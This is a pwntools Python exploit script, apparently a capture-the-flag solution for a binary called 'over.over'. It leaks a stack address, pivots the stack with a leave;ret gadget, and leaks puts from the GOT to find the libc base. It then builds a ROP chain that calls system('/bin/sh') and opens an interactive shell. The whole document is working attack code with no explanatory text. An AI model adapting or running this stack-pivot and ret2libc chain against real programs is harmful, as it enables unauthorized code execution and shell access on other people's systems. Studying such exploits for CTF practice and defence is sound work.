from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./over.over"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)
context.arch = "amd64"
payload = flat([
    "a"*(0x50-1),"b"
])
p.sendafter(">",payload)
p.recvuntil("b")
stack_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\0"))-0x70
log.success("stack_addr is " + hex(stack_addr))

# 0x50 -> padding(8) + ropchain
# old rbp -> stack_addr
# ret -> leave_ret

# ropchain -> pop_rdi,main_loop

leave_ret = 0x4006be
pop_rdi = 0x400793
main_loop = 0x400676

payload = flat([
   "c"*7,"d",
   pop_rdi,elf.got["puts"],
   elf.plt["puts"],
   main_loop
]).ljust(0x50)
payload += flat([
    stack_addr,leave_ret
])
# gdb.attach(p)
p.sendafter(">",payload)
p.recvuntil("d")
p.recvline()
puts_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\0"))
log.success("puts_addr is -> " + hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
sh_addr = libc_base + libc.search("/bin/sh").next()
log.success("system_addr is -> " + hex(system_addr))
log.success("sh_addr is -> " + hex(sh_addr))

payload = flat([
    "\x90"*8,
    pop_rdi,sh_addr,
    system_addr,
    main_loop
]).ljust(0x50)
payload += flat([
    stack_addr-0x30,
    leave_ret
    ])

p.sendafter(">",payload)

p.interactive()
